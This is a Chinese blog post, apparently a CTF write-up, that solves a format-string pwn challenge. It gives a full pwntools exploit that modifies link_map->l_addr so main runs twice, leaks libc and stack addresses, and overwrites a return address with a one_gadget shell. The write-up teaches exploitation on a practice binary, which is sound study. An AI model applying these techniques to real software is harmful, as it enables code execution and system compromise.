---
title: PWN：Seeuagain题目解答
description: 让我牵起你的手看，天地阔，岁月长。
tags: [网络安全]
category: 技术
author: 雪纷飞
draft: false
# updated: 2026-10-10
published: 2026-10-20
image: "api"
---

请前往[这篇博客][download]来下载题目！

> 本文是[那篇博客][main]的练习题的配套题解！正文已经把格式化字符串的读写原理讲得很详细了。

# 题目回顾

```text ins="Full RELRO" ins="Canary found" ins="NX enabled" ins="PIE enabled" del=/(?<=(?:SHSTK|IBT):\s{1,10})Enabled/ del="No"
$ checksec
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
$ # 由于ld.so的原因，SHSTK和IBT实际上并没有开启
$ # 另外，Linux不支持用户态程序的IBT保护
```

核心逻辑：

```c
void init()
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
}

unsigned __int64 backdoor()
{
  char buf[16]; // [rsp+0h] [rbp-1010h] BYREF
  unsigned __int64 v2; // [rsp+1008h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  read(0, buf, 0x300u);
  printf(buf);
  return v2 - __readfsqword(0x28u);
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  init();
  read(0, buff, 0x10u);
  printf(buff);
  if (sayuagain) // 全局变量
    backdoor();
  else
    sayuagain = 1;
  return 0;
}
```

IDA把`backdoor`的`buf`显示成16字节，但它的栈帧实际是`0x1010`，也就是一个`0x1000`大小的缓冲区。`read`最多读`0x300`，不会溢出；况且还有Canary保护，因此基本可以排除栈溢出的问题了。真正漏洞是`printf(buf)`这个格式化字符串——`format`受攻击者控制。

第一次进`main`时，全局变量`sayuagain`为 0，程序把它置为1，然后返回。正常执行流程下，进程随后就退出了，所以`backdoor`永远没有机会被调用。

题目名字Seeuagain和符号名`sayuagain`都在暗示：**得让`main`[再来一次][再来一次]**。

# 第一步：让`main`[再来一次][再来一次]

## `gift`：[临别礼物][临别礼物]

在符号表里有一个很显眼的全局变量`gift`，是一个指向`main`的指针：

```text
低地址
.fini_array:003DA0  dq offset __do_global_dtors_aux
gift:003DA8         dq offset main
高地址
```

况且！`gift`的位置非常非常特别：**恰好在`.fini_array`之后的 8 字节**。

:::NOTE[什么是`.fini_array`]
程序退出时，动态链接器会沿着`link_map`找到主程序的`DT_FINI_ARRAY`，然后调用其中的析构函数：

```c
fini_array = l_addr + DT_FINI_ARRAY
```

其中`l_addr`是主程序`link_map`的第一格，也就是PIE基址。它按页对齐，最低字节是`0x00`。
:::

本题，如果能够篡改`DT_FINI_ARRAY`，让它加八，那么在收尾的时候就会调用`gift`指向的指针，也就返回了`main`！

:::WARNING
但很可惜，**写`.fini_array`段上的`DT_FINI_ARRAY`是不可能的**。因为，本题开启了Full RELRO，这个内存段是只读的。尽管栈上一定有指向`DT_FINI_ARRAY`的指针，但试图去改写会直接导致段错误。
:::

仔细观察`fini_array`的计算公式，**我们换个角度，改写PIE基址不就行了**！写`ld.so`里的`link_map->l_addr`！如果能让它变成`0x08`：

```text
fini_array = (base + 8) + 0x3da0
           = base + 0x3da8
           = &gift
```

动态链接器读到的函数指针就是：

```text
*gift == main
```

`main`会被当作析构函数再调用一次！完美的[临别礼物][临别礼物]！`main`[再来一次][再来一次]时，`sayuagain`已经是1，`if (sayuagain)`成立，`backdoor()`就被调用了。

$$
\text{exit} \longrightarrow \_dl\_fini \longrightarrow *(\text{base}+3DA8) = \text{main}
$$

## 为什么是`%30$hhn`

接下来要回答两个问题：`l_addr`在哪里？怎么只改它的最低字节？

`main`里的`printf(buff)`没有传入额外的可变参数，但glibc的`printf`仍然会按`va_arg`去取参数（**全怪C语言！如果使用C++模板的可变参数包通过编译期计算哪来这么多问题！**）。按照调用约定，`printf`的具名参数`format`在`rdi`，可变参数从`rsi`开始。

```text
%1$ = rsi
%2$ = rdx
%3$ = rcx
%4$ = r8
%5$ = r9
%6$ = [main_rbp]       ← ← ← ← ← 第一个栈参数
%7$ = [main_rbp + 8]
...
%N$ = [main_rbp + 8 * (N - 6)]   (N >= 6)
```

:::NOTE
`%0$`拿不到`rdi`——这是不合法的！
:::

在第一次`main`的`printf`之前下断点：

```text ins="0x555555554000"
02:0010│ rbp rsp 0x7fffffff56d0 ◂— 1
03:0018│+008     0x7fffffff56d8 —▸ 0x7ffff7c29d90 ◂— mov edi, eax
...
0c:0060│+050     0x7fffffff5720 —▸ 0x555555557da0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555160 (__do_global_dtors_aux) ◂— endbr64
...
1a:00d0│+0c0     0x7fffffff5790 —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
```

- `rbp + 0x00`是saved rbp，值为 1；
- `rbp + 0x08`是返回`__libc_start_call_main`的地址；
- `rbp + 0x50`是`.fini_array`的地址；
- `rbp + 0xc0`是`link_map`指针，`link_map`的第一格就是PIE基址。

那就篡改`[rbp + 0xc0]`！

```text
%30$ = [main_rbp + 8 * (30 - 6)]
     = [main_rbp + 0xc0]
     = link_map
```

`%30$hhn`会写到`link_map`的起始地址，也就是`l_addr`的最低字节。只要我们在这之前输出8个字符，`hhn`就会把它写成8：

> 哦耶我爱小端序

```text
AAAAAAAA%30$hhn
```

8个`A`让`printf`的计数器停在8，`%30$hhn`把8写进`l_addr`的最低字节。在`%30$hhn`执行之后：

```text
(gdb) x/2gx 0x7ffff7ffe2e0
0x7ffff7ffe2e0: 0x0000555555554008  0x00007ffff7ffe888

(gdb) x/2gx 0x555555557da0
0x555555557da0: 0x0000555555555160  0x0000555555555279
```

`l_addr`从`0x555555554000`变成了`0x555555554008`；`.fini_array`后面8字节的`gift`就是`0x555555555279`（`main`）。于是`_dl_fini`用`l_addr + 0x3da0 = 0x555555557da8`去取析构函数，正好取到`main`。

:::IMPORTANT[再次重申！为什么不能直接写`.fini_array`为`+8`？]

因为`checksec`显示Full RELRO，`.fini_array`和`.data.rel.ro`在重定位后都是只读的。`%16$hhn`确实能拿到`.fini_array`的地址，但往只读页写会直接SIGSEGV。

`link_map`则位于`ld.so`的可写数据段，Full RELRO管不着。这就是这个题的一个小巧思吧！**不碰二进制自己的只读数据，而是改动态链接器眼里的基址。**
:::

第一次`main`返回后，`exit`会把`main`再调用一次。第二次`main`的`printf`会打印我们第二次输入的16字节，然后因为`sayuagain == 1`进入`backdoor`。

# 第二步：第二次`main`的泄漏

## `printf`的参数映射

第二次`main`的栈帧和调用者都与第一次不同。设第二次`main`的`rbp`为`R`，此时`printf(buff)`的参数映射是：

```text
%1$ .. %5$ = rsi .. r9
%6$ = [R]        # saved rbp，第一个栈参数
%7$ = [R + 8]    # 返回地址，回到 _dl_fini
%8$ = [R + 0x10]
...
%N$ = [R + 8 * (N - 6)]   (N >= 6)
```

具体来说，就是：

```text ins="0x7ffff7e1bf10" ins="0x7ffff7c45495"
02:0010│ rbp rsp 0x7fffffff55d0 —▸ 0x7fffffff5660 ◂— 0
03:0018│+008     0x7fffffff55d8 —▸ 0x7ffff7fc924e ◂— mov rax, qword ptr [rbp - 0x38]
08:0040│+030     0x7fffffff5600 —▸ 0x7fffffff5610 ◂— 0x7fffffff5600
0e:0070│+060     0x7fffffff5630 —▸ 0x7ffff7e1bf10 ◂— 0
...
15:00a8│+098     0x7fffffff5668 —▸ 0x7ffff7c45495 ◂— mov edx, 1
```

几个关键的slot：

| 参数 | 地址 | 值 | 用途 |
| --- | --- | --- | --- |
| `%6$p` | `[R]` | `R + 0x90` | 泄漏栈 |
| `%7$p` | `[R + 8]` | `ld.so` 中的返回地址 | — |
| `%12$p` | `[R + 0x30]` | `R + 0x40` | 另一个栈泄漏 |
| `%18$p` | `[R + 0x60]` | `libc + 0x21bf10` | 泄漏 libc |
| `%25$p` | `[R + 0x98]` | `libc + 0x45495` | 另一个 libc 泄漏 |

这里的 libc 基址是`0x7ffff7c00000`，所以 libc 偏移量可以直接计算：

```text
0x7ffff7e1bf10 - 0x7ffff7c00000 = 0x21bf10
0x7ffff7c45495 - 0x7ffff7c00000 = 0x45495
```

我们泄露libc基址和栈地址，是为了稍后`backdoor()`中直接篡改返回地址，返回到libc去获得shell。

# 第三步：`backdoor`的格式化字符串

## `backdoor`的栈布局

进入`backdoor`后：

```text
低地址
R - 0x1020 backdoor 的 buf
...
R - 0x18   canary
R - 0x10   backdoor 保存的 rbp = R
R - 0x08   backdoor 的返回地址     ← ← ← ← ← 我们要覆盖这里！
R + 0x00   main 保存的 rbp
R + 0x08   main 的返回地址
高地址
```

或者看这个：

```text
00:0000│-020 0x7fffffff55a0 ◂— 0
01:0008│-018 0x7fffffff55a8 —▸ 0x7ffff7ffda48 (_rtld_global+2568) ◂— 0
02:0010│-010 0x7fffffff55b0 —▸ 0x7fffffff55e0 —▸ 0x7ffff7ffe2e0 —▸ 0x555555554008 ◂— 0
03:0018│-008 0x7fffffff55b8 ◂— 0x76cb0466dfee7f00
04:0020│ rbp 0x7fffffff55c0 —▸ 0x7fffffff55d0 —▸ 0x7fffffff5660 ◂— 0
05:0028│+008 0x7fffffff55c8 —▸ 0x5555555552d8 (main+95) ◂— mov eax, 0
06:0030│+010 0x7fffffff55d0 —▸ 0x7fffffff5660 ◂— 0
07:0038│+018 0x7fffffff55d8 —▸ 0x7ffff7fc924e ◂— mov rax, qword ptr [rbp - 0x38]
```

- `rsp = 0x7fffffff45b0 = R - 0x1020`，就是`buf`；
- `rbp - 0x08 = R - 0x18 = 0x7fffffff55b8`，是canary；
- `rbp = R - 0x10 = 0x7fffffff55c0`；
- `rbp + 0x08 = R - 0x08 = 0x7fffffff55c8`，是backdoor的返回地址`main+0x5f`。

```text
%6$ = [buf]
%7$ = [buf + 8]
%8$ = [buf + 0x10]
...
%N$ = buf + 8 * (N - 6)   (N >= 6)
```

## 一步到位！

用`one_gadget libc.so.6`可以找到：

```text
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```

在`backdoor`的`ret`执行后，`rbp = R`，`rsp = R`。栈是可写的，`r10`和`[R - 0x70]`也恰好都是0，满足条件，所以这个gadget可以直接用。

```python
one_gadget = glibc.address + 0xebc81
payload = fmtstr_payload(offset=6, writes={backdoor_ret: one_gadget})
p.send(payload.ljust(0x300, b"B"))
```

`fmtstr_payload`会自己处理`%hhn`的计数、地址表和对齐，不需要手写，**真是太方便了**。`ljust(0x300, b"B")`是为了让`read(0, buf, 0x300)`一次读满，免得出现幺蛾子。

# 完整脚本

```python
from pwn import *

filename = "./pwn"
context.arch = "amd64"
context.aslr = False
context.log_level = "info"
libc = ELF("./libc.so.6", checksec=False)

p = process([filename])

p.send((b"A" * 8 + b"%30$hhn").ljust(16, b"B"))
p.recvn(8)

p.send((b"%18$12p%6$12p").ljust(16, b"B"))

libc_leak = int(p.recv(14), 16)
stack_leak = int(p.recv(14), 16)

libc.address = libc_leak - 0x21bf10
rbp = stack_leak - 0x90
backdoor_ret = rbp - 8

log.success(f"libc base   = {libc.address:#x}")
log.success(f"main rbp    = {rbp:#x}")
log.success(f"backdoor ret= {backdoor_ret:#x}")

one_gadget = libc.address + 0xebc81
payload = fmtstr_payload(offset=6, writes={backdoor_ret: one_gadget})
p.send(payload.ljust(0x300, b"B"))

p.interactive()
```

拿到 shell！

# Bonus：思考题

> [!QUESTION]
> **如果本题真的开启了Shadow Stack保护，又应该怎么完成呢？**
> 
> ~~文章的篇幅已经够长了，思考题的分析和解答就等有空了再水一篇博客吧！~~

<!-- 引用 -->

[download]: ../#题目seeuagain "题目下载"
[main]: ../ "返回正文"
[再来一次]: https://wiki.52poke.com/wiki/%E5%86%8D%E6%9D%A5%E4%B8%80%E6%AC%A1%EF%BC%88%E6%8B%9B%E5%BC%8F%EF%BC%89 "什么是再来一次？"
[临别礼物]: https://wiki.52poke.com/wiki/%E4%B8%B4%E5%88%AB%E7%A4%BC%E7%89%A9%EF%BC%88%E6%8B%9B%E5%BC%8F%EF%BC%89 "什么是临别礼物？"